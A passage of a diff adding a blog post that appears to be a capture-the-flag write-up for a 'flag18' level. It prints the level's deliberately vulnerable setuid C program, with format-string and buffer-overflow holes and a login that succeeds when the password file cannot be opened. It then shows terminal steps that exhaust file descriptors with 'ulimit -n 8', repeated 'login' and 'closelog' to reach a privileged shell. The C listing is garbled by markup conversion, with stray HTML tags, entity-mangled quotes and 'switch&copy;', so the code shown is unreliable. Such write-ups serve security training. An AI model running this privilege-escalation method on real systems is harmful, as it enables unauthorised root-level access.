+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">getopt</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="p">{</span>
+</span><span class='line'>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">debugfile</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">verbose</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span> <span class="n">globals</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">dprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;)</span> <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">)</span> <span class="err">\</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">fprintf</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">VA_ARGS</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">dvprintf</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hellip</span><span class="p">;)</span> <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span> <span class="o">&gt;=</span> <span class="n">num</span><span class="p">)</span> <span class="err">\</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">fprintf</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">VA_ARGS</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">PWFILE</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">flag18</span><span class="o">/</span><span class="n">password</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">login</span><span class="p">(</span><span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">pw</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">FILE</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">fp</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">PWFILE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">r</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="kt">char</span> <span class="n">file</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Unable to read password file %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">PWFILE</span><span class="p">);</span>
+</span><span class='line'>      <span class="k">return</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>            <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pw</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span>
+</span><span class='line'>  <span class="n">dprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">logged</span> <span class="n">in</span> <span class="n">successfully</span> <span class="p">(</span><span class="n">with</span><span class="o">%</span><span class="n">s</span> <span class="n">password</span> <span class="n">file</span><span class="p">)</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span>
+</span><span class='line'>      <span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">?</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">out</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">:</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">notsupported</span><span class="p">(</span><span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">what</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="o">&gt;</span> <span class="p">[</span><span class="o">%</span><span class="n">s</span><span class="p">]</span> <span class="n">is</span> <span class="n">unsupported</span> <span class="n">at</span> <span class="n">this</span> <span class="n">current</span> <span class="n">time</span><span class="p">.</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">what</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">dprintf</span><span class="p">(</span><span class="n">what</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">setuser</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">msg</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">sprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">unable</span> <span class="n">to</span> <span class="n">set</span> <span class="n">user</span> <span class="n">to</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">%</span><span class="n">s</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span> <span class="n">not</span> <span class="n">supported</span><span class="p">.</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">user</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">msg</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">c</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">d</span><span class="p">:</span><span class="n">v</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">switch</span><span class="o">&amp;</span><span class="n">copy</span><span class="p">;</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">case</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">d</span><span class="err">&#39;</span><span class="o">:</span>
+</span><span class='line'>              <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">optarg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">w</span><span class="o">+&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'>              <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">open</span> <span class="o">%</span><span class="n">s</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">optarg</span><span class="p">);</span>
+</span><span class='line'>              <span class="n">setvbuf</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>          <span class="k">case</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">v</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">:</span>
+</span><span class='line'>              <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="o">++</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">dprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Starting</span> <span class="n">up</span><span class="p">.</span> <span class="n">Verbose</span> <span class="n">level</span> <span class="o">=</span> <span class="o">%</span><span class="n">d</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
+</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span><span class='line'>      <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">p</span><span class="p">,</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">q</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="n">q</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;\r&#39;</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">dvprintf</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&quot;got [%s] as input</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;login&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;attempting to login</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">login</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;logout&quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;shell&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;attempting to start shell</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span><span class='line'>          <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;unable to execve&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Permission denied</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;logout&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;closelog&quot;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">)</span> <span class="n">fclose</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;site exec&quot;</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">notsupported</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">10</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;setuser&quot;</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">setuser</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>First thing that we tried was to use parameter <code>-d /home/flag18/password</code> to
+rewrite password file with the known output, however the <code>strcmp()</code> don&rsquo;t match
+for the reason that we cannot insert the newline character to the end of our string.</p>
+
+<p>The <code>fclose()</code> on line 34 is not aligned, that&rsquo;s strange. We found out that this call is not used in the binary file:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ gdb -batch -ex &lsquo;file /home/flag18/flag18&rsquo; -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;disassemble login&rsquo; | grep close
+</span><span class='line'>sh-4.2$</span></code></pre></td></tr></table></div></figure></p>
+
+<p>We can use login function to exhaust file descriptors, because when the <code>fopen()</code> fails, we will be logged in. After a few tries:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ help ulimit
+</span><span class='line'>[..snip..]
+</span><span class='line'>      -n        the maximum number of open file descriptors
+</span><span class='line'>[..snip..]&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ ulimit -n 8&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ /home/flag18/flag18 -d /dev/tty -vvv
+</span><span class='line'>Starting up. Verbose level = 3
+</span><span class='line'>login
+</span><span class='line'>got [login] as input
+</span><span class='line'>attempting to login
+</span><span class='line'>login
+</span><span class='line'>got [login] as input
+</span><span class='line'>attempting to login
+</span><span class='line'>login
+</span><span class='line'>got [login] as input
+</span><span class='line'>attempting to login
+</span><span class='line'>login
+</span><span class='line'>got [login] as input
+</span><span class='line'>attempting to login
+</span><span class='line'>login
+</span><span class='line'>got [login] as input
+</span><span class='line'>attempting to login
+</span><span class='line'>logged in successfully (without password file)
+</span><span class='line'>closelog
+</span><span class='line'>got [closelog] as input
+</span><span class='line'>shell
+</span><span class='line'>/home/flag18/flag18: -d: invalid option
+</span><span class='line'>Usage:  /home/flag18/flag18 [GNU long option] [option] &hellip;
+</span><span class='line'>        /home/flag18/flag18 [GNU long option] [option] script-file &hellip;
+</span><span class='line'>GNU long options:
+</span><span class='line'>        &ndash;debug
+</span><span class='line'>        &ndash;debugger
+</span><span class='line'>        &ndash;dump-po-strings
+</span><span class='line'>        &ndash;dump-strings
+</span><span class='line'>        &ndash;help
+</span><span class='line'>        &ndash;init-file
+</span><span class='line'>        &ndash;login
+</span><span class='line'>        &ndash;noediting
+</span><span class='line'>        &ndash;noprofile
+</span><span class='line'>        &ndash;norc
+</span><span class='line'>        &ndash;posix
+</span><span class='line'>        &ndash;protected
+</span><span class='line'>        &ndash;rcfile
+</span><span class='line'>        &ndash;restricted
+</span><span class='line'>        &ndash;verbose
+</span><span class='line'>        &ndash;version
+</span><span class='line'>Shell options:
+</span><span class='line'>        -irsD or -c command or -O shopt_option          (invocation only)
+</span><span class='line'>        -abefhkmnptuvxBCHP or -o option</span></code></pre></td></tr></table></div></figure></p>
+
+<p>We used <code>closelog</code> to close one used descriptor and the shell is invoked,
+unfortunately we need to get rid of -d parameter too, bash is recycling
+our argv, see <code>execve("/bin/sh", argv, envp);</code>.</p>
+
